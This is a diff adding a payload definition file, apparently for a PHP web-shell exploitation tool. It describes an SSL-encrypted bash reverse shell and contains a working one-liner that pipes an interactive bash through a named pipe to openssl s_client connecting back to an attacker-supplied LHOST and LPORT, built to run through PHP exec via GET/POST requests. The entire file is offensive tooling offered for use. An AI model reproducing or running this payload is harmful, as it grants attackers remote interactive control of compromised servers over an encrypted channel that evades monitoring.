@@ -1,0 +1,5 @@
+title=bash OpenSSL TCP reverse shell payload for simple php web shell
+info=bash command to spawn a SSL encrypted reverse shell. Not using &, so is working with php exec through GET/POST requests. No STDERR.
+required_opts=LHOST;LPORT
+connector=reverse_tcp_openssl
+payload=mkfifo /tmp/RNDSTR; /bin/bash -i < /tmp/RNDSTR | openssl s_client -quiet -connect LHOST:LPORT > /tmp/RNDSTR; rm /tmp/RNDSTR
